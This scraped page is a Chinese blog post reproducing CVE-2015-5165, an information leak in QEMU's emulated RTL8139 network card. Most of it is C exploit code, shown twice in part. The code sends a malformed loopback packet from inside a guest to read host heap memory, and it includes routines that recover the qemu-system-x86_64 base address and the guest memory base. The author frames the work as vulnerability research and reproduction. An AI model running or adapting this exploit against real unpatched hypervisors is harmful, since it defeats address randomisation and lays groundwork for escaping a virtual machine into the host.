hardware address. */ MAR0 = 8, /* Multicast filter. */ TxStatus0 = 0x10,/* Transmit status (Four 32bit registers). C mode only */ /* Dump Tally Conter control register(64bit). C+ mode only */ TxAddr0 = 0x20, /* Tx descriptors (also four 32bit). */ RxBuf = 0x30, ChipCmd = 0x37, RxBufPtr = 0x38, RxBufAddr = 0x3A, IntrMask = 0x3C, IntrStatus = 0x3E, TxConfig = 0x40, RxConfig = 0x44, Timer = 0x48, /* A general-purpose counter. */ RxMissed = 0x4C, /* 24 bits valid, write clears. */ Cfg9346 = 0x50, Config0 = 0x51, Config1 = 0x52, FlashReg = 0x54, MediaStatus = 0x58, Config3 = 0x59, Config4 = 0x5A, /* absent on RTL-8139A */ HltClk = 0x5B, MultiIntr = 0x5C, PCIRevisionID = 0x5E, TxSummary = 0x60, /* TSAD register. Transmit Status of All Descriptors*/ BasicModeCtrl = 0x62, BasicModeStatus = 0x64, NWayAdvert = 0x66, NWayLPAR = 0x68, NWayExpansion = 0x6A, /* Undocumented registers, but required for proper operation. */ FIFOTMS = 0x70, /* FIFO Control and test. */ CSCR = 0x74, /* Chip Status and Configuration Register. */ PARA78 = 0x78, PARA7c = 0x7c, /* Magic transceiver parameter register. */ Config5 = 0xD8, /* absent on RTL-8139A */ /* C+ mode */ TxPoll = 0xD9, /* Tell chip to check Tx descriptors for work */ RxMaxSize = 0xDA, /* Max size of an Rx packet (8169 only) */ CpCmd = 0xE0, /* C+ Command register (C+ mode only) */ IntrMitigate = 0xE2, /* rx/tx interrupt mitigation control */ RxRingAddrLO = 0xE4, /* 64-bit start addr of Rx ring */ RxRingAddrHI = 0xE8, /* 64-bit start addr of Rx ring */ TxThresh = 0xEC, /* Early Tx threshold */ }; /* Bits in TxConfig. */ enum tx_config_bits { /* Interframe Gap Time. Only TxIFG96 doesn't violate IEEE 802.3 */ TxIFGShift = 24, TxIFG84 = (0 \u003c\u003c TxIFGShift), /* 8.4us / 840ns (10 / 100Mbps) */ TxIFG88 = (1 \u003c\u003c TxIFGShift), /* 8.8us / 880ns (10 / 100Mbps) */ TxIFG92 = (2 \u003c\u003c TxIFGShift), /* 9.2us / 920ns (10 / 100Mbps) */ TxIFG96 = (3 \u003c\u003c TxIFGShift), /* 9.6us / 960ns (10 / 100Mbps) */ TxLoopBack = (1 \u003c\u003c 18) | (1 \u003c\u003c 17), /* enable loopback test mode */ TxCRC = (1 \u003c\u003c 16), /* DISABLE appending CRC to end of Tx packets */ TxClearAbt = (1 \u003c\u003c 0), /* Clear abort (WO) */ TxDMAShift = 8, /* DMA burst value (0-7) is shifted this many bits */ TxRetryShift = 4, /* TXRR value (0-15) is shifted this many bits */ TxVersionMask = 0x7C800000, /* mask out version bits 30-26, 23 */ }; /* Bits in RxConfig. */ enum rx_mode_bits { AcceptErr = 0x20, AcceptRunt = 0x10, AcceptBroadcast = 0x08, AcceptMulticast = 0x04, AcceptMyPhys = 0x02, AcceptAllPhys = 0x01, }; enum ChipCmdBits { CmdReset = 0x10, CmdRxEnb = 0x08, CmdTxEnb = 0x04, RxBufEmpty = 0x01, }; /* C+ mode */ enum CplusCmdBits { CPlusRxVLAN = 0x0040, /* enable receive VLAN detagging */ CPlusRxChkSum = 0x0020, /* enable receive checksum offloading */ CPlusRxEnb = 0x0002, CPlusTxEnb = 0x0001, }; // big endian // ethernet frame uint8_t packet[] = { /* 以太网帧 */ // dst 0x52, 0x54, 0x00, 0x12, 0x34, 0x57, // src 0x52, 0x54, 0x00, 0x12, 0x34, 0x57, // 类型(代表IP协议) 0x08, 0x00, /* IP数据报 */ // 版本和首部长度 (0x4 \u003c\u003c 4) | 0x5, // TOS 0x00, // 总长度 0x00, 0x13, // 标识 0xde, 0xad, // 标志(3bit)和片偏移(以8为基本单位，也就是相当于把标志的3bit当做0来计算) 0x40, 0x00, // TTL 0x40, // 上层协议，代表TCP 0x06, // 首部校验和 0xde, 0xad, // 源IP 0x7f, 0x00, 0x00, 0x01, // 目的IP 0x7f, 0x00, 0x00, 0x01, /* TCP数据报 */ // 源端口 0xde, 0xad, // 目的端口 0xbe, 0xef, // Sequence Number 0x00, 0x00, 0x00, 0x00, // Acknowledgement Number 0x00, 0x00, 0x00, 0x00, // 报头长度等 0x50, // 0x10, // Window size 0xde, 0xed, // TCP checksum 0xde, 0xad, // Urgent pointer 0x00, 0x00 }; // RTL8139 Rx/Tx descriptor typedef struct rtl8139_desc { uint32_t dw0; uint32_t dw1; uint32_t buf_lo; uint32_t buf_hi; }rtl8139_desc; // RTL8139 Rx/Tx ring typedef struct rtl8139_ring { struct rtl8139_desc *desc; void *buffer; }rtl8139_ring; uint64_t gva_to_gpa(void *addr) { int fd = open(\"/proc/self/pagemap\", O_RDONLY); if (fd \u003c 0) { perror(\"open\"); exit(-1); } uint64_t pme, gfn; size_t offset; offset = ((uint64_t)addr \u003e\u003e 9) \u0026 ~7; lseek(fd, offset, SEEK_SET); read(fd, \u0026pme, 8); if (!(pme \u0026 PAGE_PRESENT)) return -1; gfn = pme \u0026 PAGE_PFN; return (gfn \u003c\u003c PAGE_SHIFT) | ((uint64_t)addr \u0026 ((1 \u003c\u003c PAGE_SHIFT) - 1)); } void pmio_writeb(uint32_t data, uint32_t port) { outb(data, PMIO_BASE+port); } void pmio_writew(uint32_t data, uint32_t port) { outw(data, PMIO_BASE+port); } void pmio_writel(uint32_t data, uint32_t port) { outl(data, PMIO_BASE+port); } uint32_t pmio_readb(uint32_t port) { return (uint32_t)inb(PMIO_BASE+port); } uint32_t pmio_readw(uint32_t port) { return (uint32_t)inw(PMIO_BASE+port); } uint32_t pmio_readl(uint32_t port) { return (uint32_t)inl(PMIO_BASE+port); } void rtl8139_desc_config_rx(rtl8139_ring *ring, rtl8139_desc *desc, size_t nb) { size_t buffer_size = RTL8139_BUFFER_SIZE + 4; for (int i = 0; i \u003c nb; ++i) { memset(\u0026desc[i], 0, sizeof(desc[i])); ring[i].desc = \u0026desc[i]; ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size); memset(ring[i].buffer, 0, buffer_size); ring[i].desc-\u003edw0 |= CP_RX_OWN; ring[i].desc-\u003edw0 |= buffer_size; ring[i].desc-\u003ebuf_lo = (uint32_t)gva_to_gpa(ring[i].buffer); // printf(\"buffer[%d]: 0x%x\\n\", i, ring[i].desc-\u003ebuf_lo); // for debug } pmio_writel((uint32_t)gva_to_gpa(desc), RxRingAddrLO); pmio_writel(0, RxRingAddrHI); } void rtl8139_desc_config_tx(rtl8139_desc *desc, void *buffer) { memset(desc, 0, sizeof(rtl8139_desc)); desc-\u003edw0 |= CP_TX_OWN | CP_TX_EOR | CP_TX_LS | CP_TX_IPCS | CP_TX_TCPCS| CP_TX_LGSEN; desc-\u003edw0 |= RTL8139_BUFFER_SIZE; desc-\u003ebuf_lo = (uint32_t)gva_to_gpa(buffer); pmio_writel((uint32_t)gva_to_gpa(desc), TxAddr0); pmio_writel(0, TxAddr0+4); } void rtl8139_card_config() { pmio_writel(TxLoopBack, TxConfig); pmio_writel(AcceptMyPhys, RxConfig); pmio_writew(CPlusRxEnb|CPlusTxEnb, CpCmd); pmio_writeb(CmdRxEnb|CmdTxEnb, ChipCmd); } void rtl8139_packet_send(void *buffer, void *packet, size_t len) { if (len \u003c= RTL8139_BUFFER_SIZE) { memcpy(buffer, packet, len); pmio_writeb(1\u003c\u003c6, TxPoll); } } void xxd(uint8_t *ptr, size_t size) { for (int i = 0, j = 0; i \u003c size; ++i, ++j) { if (i % 16 == 0) { j = 0; printf(\"\\n0x%08x: \", (uint32_t)(ptr+i)); } printf(\"%02x \", ptr[i]); if (j == 7) { printf(\"- \"); } } printf(\"\\n\"); } int main(int argc, char *argv[]) { // 44*1500 = 66000 \u003e ip_data_len = 65535 size_t rtl8139_rx_nb = 44; rtl8139_ring *rtl8139_rx_ring; rtl8139_desc *rtl8139_rx_desc, *rtl8139_tx_desc; rtl8139_rx_ring = (rtl8139_ring *)aligned_alloc( PAGE_SIZE, rtl8139_rx_nb*sizeof(rtl8139_ring) ); rtl8139_rx_desc = (rtl8139_desc *)aligned_alloc( PAGE_SIZE, rtl8139_rx_nb*sizeof(rtl8139_desc) ); rtl8139_tx_desc = (rtl8139_desc *)aligned_alloc( PAGE_SIZE, sizeof(rtl8139_desc) ); void *rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE); iopl(3); rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb); rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer); rtl8139_card_config(); rtl8139_packet_send(rtl8139_tx_buffer, packet, sizeof(packet)); sleep(7); for (int i = 0; i \u003c rtl8139_rx_nb; ++i) { // for (int i = 0; i \u003c 2; ++i) { xxd((uint8_t *)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE); } return 0; } Exploit 原文章[2]中通过这个漏洞获得了qemu-system-x86_64进程加载的基址，和为客户机所MMAP的内存基址。在我的复现环境中未能得到虚拟机内存的基址。下面说一下获得text基址的方法和我所做的一些尝试。\n文章[2]在泄露的信息中搜索保存了ObjectProperty对象的堆块（可能是被释放的堆块），通过读取ObjectProperty中所保存的函数指针来泄露qemu-system-x86_64的基地址。\n泄露的数据如下图：\n此时进程vmmap如下：\n1 2 3 4 5 6 7 8 9 0x555555554000 0x5555555f2000 r--p 9e000 0 qemu-system-x86_64 0x5555555f2000 0x5555559c9000 r-xp 3d7000 9e000 qemu-system-x86_64 0x5555559c9000 0x555555b15000 r--p 14c000 475000 qemu-system-x86_64 0x555555b15000 0x555555be0000 r--p cb000 5c0000 qemu-system-x86_64 0x555555be0000 0x555555c5e000 rw-p 7e000 68b000 qemu-system-x86_64 0x555555c5e000 0x5555586bc000 rw-p 2a5e000 0 [heap] # ....... 0x7fff93600000 0x7fffd3600000 rw-p 40000000 0 # MMAPED Memory: 1G # ....... 我是在泄露的信息中寻找形似函数指针的数据进行验证（在泄露的数据之中搜索55 55 55），验证是否为某函数（其实看函数名字，也就是ObjectProperty中的成员）。\n然后使用任意函数低12位地址进行匹配，减去其偏移得到基地址。\n至于客户机内存基地址，在泄露的数据搜索ff 7f，没注意到与0x7fff93600000 0x7fffd3600000 rw-p 40000000 0有强烈关联的地址。而且在我这里，所分配的1G地址空间，低20位为0；网上exploit都是低24位为0的。\nexp.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 #include #include #include #include #include #include #include #include // 页面相关 #define PAGE_SHIFT 12 #define PAGE_SIZE (1 \u003c\u003c PAGE_SHIFT) #define PAGE_PRESENT (1ULL \u003c\u003c 63) #define PAGE_PFN ((1ULL \u003c\u003c 55) - 1) // RTL8139 PMIO base address #define PMIO_BASE 0xC000 // Ethernet Frame // DST(6) + SRC(6) + Length/Type(2) + MTU(1500) #define RTL8139_BUFFER_SIZE 1514 /* w0 ownership flag */ #define CP_RX_OWN (1\u003c\u003c31) /* w0 ownership flag */ #define CP_TX_OWN (1\u003c\u003c31) /* w0 end of ring flag */ #define CP_TX_EOR (1\u003c\u003c30) /* first segment of received packet flag */ #define CP_TX_FS (1\u003c\u003c29) /* last segment of received packet flag */ #define CP_TX_LS (1\u003c\u003c28) /* large send packet flag */ #define CP_TX_LGSEN (1\u003c\u003c27) /* large send MSS mask, bits 16...25 */ #define CP_TC_LGSEN_MSS_MASK ((1 \u003c\u003c 12) - 1) /* IP checksum offload flag */ #define CP_TX_IPCS (1\u003c\u003c18) /* UDP checksum offload flag */ #define CP_TX_UDPCS (1\u003c\u003c17) /* TCP checksum offload flag */ #define CP_TX_TCPCS (1\u003c\u003c16) /* w0 bits 0...15 : buffer size */ #define CP_TX_BUFFER_SIZE (1\u003c\u003c16) #define CP_TX_BUFFER_SIZE_MASK (CP_TX_BUFFER_SIZE - 1) /* w1 add tag flag */ #define CP_TX_TAGC (1\u003c\u003c17) /* w1 bits 0...15 : VLAN tag (big endian) */ #define CP_TX_VLAN_TAG_MASK ((1\u003c\u003c16) - 1) /* w2 low 32bit of Rx buffer ptr */ /* w3 high 32bit of Rx buffer ptr */ /* set after transmission */ /* FIFO underrun flag */ #define CP_TX_STATUS_UNF (1\u003c\u003c25) /* transmit error summary flag, valid if set any of three below */ #define CP_TX_STATUS_TES (1\u003c\u003c23) /* out-of-window collision flag */ #define CP_TX_STATUS_OWC (1\u003c\u003c22) /* link failure flag */ #define CP_TX_STATUS_LNKF (1\u003c\u003c21) /* excessive collisions flag */ #define CP_TX_STATUS_EXC (1\u003c\u003c20) /* Symbolic offsets to registers. */ enum RTL8139_registers { MAC0 = 0, /* Ethernet hardware address. */ MAR0 = 8, /* Multicast filter. */ TxStatus0 = 0x10,/* Transmit status (Four 32bit registers). C mode only */ /* Dump Tally Conter control register(64bit). C+ mode only */ TxAddr0 = 0x20, /* Tx descriptors (also four 32bit). */ RxBuf = 0x30, ChipCmd = 0x37, RxBufPtr = 0x38, RxBufAddr = 0x3A, IntrMask = 0x3C, IntrStatus = 0x3E, TxConfig = 0x40, RxConfig = 0x44, Timer = 0x48, /* A general-purpose counter. */ RxMissed = 0x4C, /* 24 bits valid, write clears. */ Cfg9346 = 0x50, Config0 = 0x51, Config1 = 0x52, FlashReg = 0x54, MediaStatus = 0x58, Config3 = 0x59, Config4 = 0x5A, /* absent on RTL-8139A */ HltClk = 0x5B, MultiIntr = 0x5C, PCIRevisionID = 0x5E, TxSummary = 0x60, /* TSAD register. Transmit Status of All Descriptors*/ BasicModeCtrl = 0x62, BasicModeStatus = 0x64, NWayAdvert = 0x66, NWayLPAR = 0x68, NWayExpansion = 0x6A, /* Undocumented registers, but required for proper operation. */ FIFOTMS = 0x70, /* FIFO Control and test. */ CSCR = 0x74, /* Chip Status and Configuration Register. */ PARA78 = 0x78, PARA7c = 0x7c, /* Magic transceiver parameter register. */ Config5 = 0xD8, /* absent on RTL-8139A */ /* C+ mode */ TxPoll = 0xD9, /* Tell chip to check Tx descriptors for work */ RxMaxSize = 0xDA, /* Max size of an Rx packet (8169 only) */ CpCmd = 0xE0, /* C+ Command register (C+ mode only) */ IntrMitigate = 0xE2, /* rx/tx interrupt mitigation control */ RxRingAddrLO = 0xE4, /* 64-bit start addr of Rx ring */ RxRingAddrHI = 0xE8, /* 64-bit start addr of Rx ring */ TxThresh = 0xEC, /* Early Tx threshold */ }; /* Bits in TxConfig. */ enum tx_config_bits { /* Interframe Gap Time. Only TxIFG96 doesn't violate IEEE 802.3 */ TxIFGShift = 24, TxIFG84 = (0 \u003c\u003c TxIFGShift), /* 8.4us / 840ns (10 / 100Mbps) */ TxIFG88 = (1 \u003c\u003c TxIFGShift), /* 8.8us / 880ns (10 / 100Mbps) */ TxIFG92 = (2 \u003c\u003c TxIFGShift), /* 9.2us / 920ns (10 / 100Mbps) */ TxIFG96 = (3 \u003c\u003c TxIFGShift), /* 9.6us / 960ns (10 / 100Mbps) */ TxLoopBack = (1 \u003c\u003c 18) | (1 \u003c\u003c 17), /* enable loopback test mode */ TxCRC = (1 \u003c\u003c 16), /* DISABLE appending CRC to end of Tx packets */ TxClearAbt = (1 \u003c\u003c 0), /* Clear abort (WO) */ TxDMAShift = 8, /* DMA burst value (0-7) is shifted this many bits */ TxRetryShift = 4, /* TXRR value (0-15) is shifted this many bits */ TxVersionMask = 0x7C800000, /* mask out version bits 30-26, 23 */ }; /* Bits in RxConfig. */ enum rx_mode_bits { AcceptErr = 0x20, AcceptRunt = 0x10, AcceptBroadcast = 0x08, AcceptMulticast = 0x04, AcceptMyPhys = 0x02, AcceptAllPhys = 0x01, }; enum ChipCmdBits { CmdReset = 0x10, CmdRxEnb = 0x08, CmdTxEnb = 0x04, RxBufEmpty = 0x01, }; /* C+ mode */ enum CplusCmdBits { CPlusRxVLAN = 0x0040, /* enable receive VLAN detagging */ CPlusRxChkSum = 0x0020, /* enable receive checksum offloading */ CPlusRxEnb = 0x0002, CPlusTxEnb = 0x0001, }; // big endian // ethernet frame uint8_t packet[] = { /* 以太网帧 */ // dst 0x52, 0x54, 0x00, 0x12, 0x34, 0x57, // src 0x52, 0x54, 0x00, 0x12, 0x34, 0x57, // 类型(代表IP协议) 0x08, 0x00, /* IP数据报 */ // 版本和首部长度 (0x4 \u003c\u003c 4) | 0x5, // TOS 0x00, // 总长度 0x00, 0x13, // 标识 0xde, 0xad, // 标志(3bit)和片偏移(以8为基本单位，也就是相当于把标志的3bit当做0来计算) 0x40, 0x00, // TTL 0x40, // 上层协议，代表TCP 0x06, // 首部校验和 0xde, 0xad, // 源IP 0x7f, 0x00, 0x00, 0x01, // 目的IP 0x7f, 0x00, 0x00, 0x01, /* TCP数据报 */ // 源端口 0xde, 0xad, // 目的端口 0xbe, 0xef, // Sequence Number 0x00, 0x00, 0x00, 0x00, // Acknowledgement Number 0x00, 0x00, 0x00, 0x00, // 报头长度等 0x50, // 0x10, // Window size 0xde, 0xed, // TCP checksum 0xde, 0xad, // Urgent pointer 0x00, 0x00 }; // RTL8139 Rx/Tx descriptor typedef struct rtl8139_desc { uint32_t dw0; uint32_t dw1; uint32_t buf_lo; uint32_t buf_hi; }rtl8139_desc; // RTL8139 Rx/Tx ring typedef struct rtl8139_ring { struct rtl8139_desc *desc; void *buffer; }rtl8139_ring; uint64_t gva_to_gpa(void *addr) { int fd = open(\"/proc/self/pagemap\", O_RDONLY); if (fd \u003c 0) { perror(\"open\"); exit(-1); } uint64_t pme, gfn; size_t offset; offset = ((uint64_t)addr \u003e\u003e 9) \u0026 ~7; lseek(fd, offset, SEEK_SET); read(fd, \u0026pme, 8); if (!(pme \u0026 PAGE_PRESENT)) return -1; gfn = pme \u0026 PAGE_PFN; return (gfn \u003c\u003c PAGE_SHIFT) | ((uint64_t)addr \u0026 ((1 \u003c\u003c PAGE_SHIFT) - 1)); } void pmio_writeb(uint32_t data, uint32_t port) { outb(data, PMIO_BASE+port); } void pmio_writew(uint32_t data, uint32_t port) { outw(data, PMIO_BASE+port); } void pmio_writel(uint32_t data, uint32_t port) { outl(data, PMIO_BASE+port); } uint32_t pmio_readb(uint32_t port) { return (uint32_t)inb(PMIO_BASE+port); } uint32_t pmio_readw(uint32_t port) { return (uint32_t)inw(PMIO_BASE+port); } uint32_t pmio_readl(uint32_t port) { return (uint32_t)inl(PMIO_BASE+port); } void rtl8139_desc_config_rx(rtl8139_ring *ring, rtl8139_desc *desc, size_t nb) { size_t buffer_size = RTL8139_BUFFER_SIZE + 4; for (int i = 0; i \u003c nb; ++i) { memset(\u0026desc[i], 0, sizeof(desc[i])); ring[i].desc = \u0026desc[i]; ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size); memset(ring[i].buffer, 0, buffer_size); ring[i].desc-\u003edw0 |= CP_RX_OWN; ring[i].desc-\u003edw0 |= buffer_size; ring[i].desc-\u003ebuf_lo = (uint32_t)gva_to_gpa(ring[i].buffer); // printf(\"buffer[%d]: 0x%x\\n\", i, ring[i].desc-\u003ebuf_lo); // for debug } pmio_writel((uint32_t)gva_to_gpa(desc), RxRingAddrLO); pmio_writel(0, RxRingAddrHI); } void rtl8139_desc_config_tx(rtl8139_desc *desc, void *buffer) { memset(desc, 0, sizeof(rtl8139_desc)); desc-\u003edw0 |= CP_TX_OWN | CP_TX_EOR | CP_TX_LS | CP_TX_IPCS | CP_TX_TCPCS| CP_TX_LGSEN; desc-\u003edw0 |= RTL8139_BUFFER_SIZE; desc-\u003ebuf_lo = (uint32_t)gva_to_gpa(buffer); pmio_writel((uint32_t)gva_to_gpa(desc), TxAddr0); pmio_writel(0, TxAddr0+4); } void rtl8139_card_config() { pmio_writel(TxLoopBack, TxConfig); pmio_writel(AcceptMyPhys, RxConfig); pmio_writew(CPlusRxEnb|CPlusTxEnb, CpCmd); pmio_writeb(CmdRxEnb|CmdTxEnb, ChipCmd); } void rtl8139_packet_send(void *buffer, void *packet, size_t len) { if (len \u003c= RTL8139_BUFFER_SIZE) { memcpy(buffer, packet, len); pmio_writeb(1\u003c\u003c6, TxPoll); } } void xxd(uint8_t *ptr, size_t size) { for (int i = 0, j = 0; i \u003c size; ++i, ++j) { if (i % 16 == 0) { j = 0; printf(\"\\n0x%08x: \", (uint32_t)(ptr+i)); } printf(\"%02x \", ptr[i]); if (j == 7) { printf(\"- \"); } } printf(\"\\n\"); } uint64_t leak_text_base_addr(rtl8139_ring *ring, size_t ring_count) { const uint64_t property_release_bool_offset = 0x379DEF; const uint64_t property_get_str = 0x379a57; uint64_t offset[2] = {property_get_str, property_release_bool_offset}; const uint64_t mask = 0xFFF; for (int i = 0; i \u003c ring_count; ++i) { uint8_t *ptr = (uint8_t *)ring[i].buffer + 56; uint8_t *end = (uint8_t *)ring[i].buffer + RTL8139_BUFFER_SIZE / 4 * 4; while (ptr \u003c end - 8) { uint64_t value = *(uint64_t *)ptr; for (int j = 0; j \u003c 2; ++j) { if ((value \u0026 mask) == (offset[j] \u0026 mask)) { return value - offset[j]; } } ptr += 4; } } return -1; } uint64_t leak_physical_addr(rtl8139_ring *ring, size_t ring_count) { const uint64_t mask = 0xffff000000ULL; uint32_t array[0x10000]; uint32_t index = 0; memset(array, 0, sizeof(array)); for (int i = 0; i \u003c ring_count; ++i) { uint8_t *ptr = (uint8_t *)ring[i].buffer + 56; uint8_t *end = (uint8_t *)ring[i].buffer + RTL8139_BUFFER_SIZE/4*4; while (ptr \u003c end - 8) { uint64_t value = *(uint64_t *)ptr; if (((value \u003e\u003e 40) \u0026 0xff) == 0x7f) { value = (value \u0026 mask) \u003e\u003e 24; array[value]++; if (array[value] \u003e array[index]) { index = value; } } ptr += 4; } } uint64_t memory_size = 0x40000000; return (((uint64_t)index | 0x7f0000) \u003c\u003c 24) - memory_size; } int main(int argc, char *argv[]) { // 44*1500 = 66000 \u003e ip_data_len = 65535 size_t rtl8139_rx_nb = 44; rtl8139_ring *rtl8139_rx_ring; rtl8139_desc *rtl8139_rx_desc, *rtl8139_tx_desc; rtl8139_rx_ring = (rtl8139_ring *)aligned_alloc( PAGE_SIZE, rtl8139_rx_nb*sizeof(rtl8139_ring) ); rtl8139_rx_desc = (rtl8139_desc *)aligned_alloc( PAGE_SIZE, rtl8139_rx_nb*sizeof(rtl8139_desc) ); rtl8139_tx_desc = (rtl8139_desc *)aligned_alloc( PAGE_SIZE, sizeof(rtl8139_desc) ); void *rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE); iopl(3); rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb); rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer); rtl8139_card_config(); rtl8139_packet_send(rtl8139_tx_buffer, packet, sizeof(packet)); sleep(7); for (int i = 0; i \u003c rtl8139_rx_nb; ++i) { // for (int i = 0; i \u003c 2; ++i) { xxd((uint8_t *)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE); } uint64_t text_base_addr = leak_text_base_addr(rtl8139_rx_ring, rtl8139_rx_nb); printf(\"Text base address: 0x%llx\\n\", text_base_addr); uint64_t physical_addr = leak_physical_addr(rtl8139_rx_ring, rtl8139_rx_nb); // ERROR printf(\"Physical address: 0x%llx\\n\", physical_addr); return 0; } 遇到的问题 ifconfig得到的MAC地址是52:54:00:12:34:56，但是rtl8139_do_receive中进行比对时，比对的MAC地址是52:54:00:12:34:57。 与前人的exploit对比得知，函数的偏移有所变化（如property_get_bool），应该是编译的问题。需要自行查看泄露的数据，进行验证。 使用scp命令拷贝到客户机，无法拷贝成功。后使用python3 -m http.server进行文件的传输。 参考 misc git - Find a commit on GitHub given the commit hash - Stack Overflow RTL8139 - OSDev Wiki 以太网帧格式 - 维基百科，自由的百科全书 (wikipedia.org) IP 数据报 - AhuntSun - 博客园 (cnblogs.com) 一张图了解TCP/IP五层网络模型_在路上-CSDN博客 vulnerability QEMU 信息泄露漏洞 CVE-2015-5165 分析及利用 | 程序人生 (programlife.net) .:: Phrack Magazine ::. QEMU Case Study Virtualized_Learning/Vulnerability/CVE-2015-5165 at master · Resery/Virtualized_Learning qemu-pwn-cve-2015-5165信息泄露漏洞分析 « 纵有寂寂无名时 (ray-cp.github.io) QEMU escape: Part 3 Information Leakage (CVE-2015-5165) – 氷 菓 (dangokyo.me) ","wordCount":"9632","inLanguage":"zh-cn","datePublished":"2020-12-05T15:58:52Z","dateModified":"2020-12-05T15:58:52Z","author":{"@type":"Person","name":"hhdx"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hhdx.xyz/post/cve-2015-5165/"},"publisher":{"@type":"Organization","name":"hhdx's blog","logo":{"@type":"ImageObject","url":"https://hhdx.xyz/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hhdx.xyz/ accesskey=h title="hhdx's blog (Alt + H)">hhdx's blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hhdx.xyz/ title=主页><span>主页</span></a></li><li><a href=https://hhdx.xyz/post/ title=归档><span>归档</span></a></li><li><a href=https://hhdx.xyz/tags/ title=标签><span>标签</span></a></li><li><a href=https://hhdx.xyz/underway/ title=施工中><span>施工中</span></a></li><li><a href=https://hhdx.xyz/about/ title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">QEMU信息泄露漏洞分析与利用----CVE-2015-5165</h1><div class=post-meta><span title='2020-12-05 15:58:52 +0000 UTC'>December 5, 2020</span>&nbsp;·&nbsp;hhdx</div></header><div class=post-content><p>参考大佬们的文章复现CVE-2015-5165。</p><h2 id=环境搭建>环境搭建<a hidden class=anchor aria-hidden=true href=#环境搭建>#</a></h2><p>宿主机环境 Ubuntu 20.10</p><h3 id=qemu编译>QEMU编译<a hidden class=anchor aria-hidden=true href=#qemu编译>#</a></h3><p>QEMU <a href=https://github.com/qemu/qemu/tree/bd80b5963f58c601f31d3186b89887bf8e182fb5>commit-bd80b59</a>源码下载。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ unzip qemu.zip
</span></span><span class=line><span class=cl>$ mkdir -p bin/debug/native
</span></span><span class=line><span class=cl>$ <span class=nb>cd</span> bin/debug/native
</span></span><span class=line><span class=cl>$ sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev
</span></span><span class=line><span class=cl>$ ../../../configure --target-list<span class=o>=</span>x86_64-softmmu --enable-debug --disable-werror
</span></span><span class=line><span class=cl>$ make
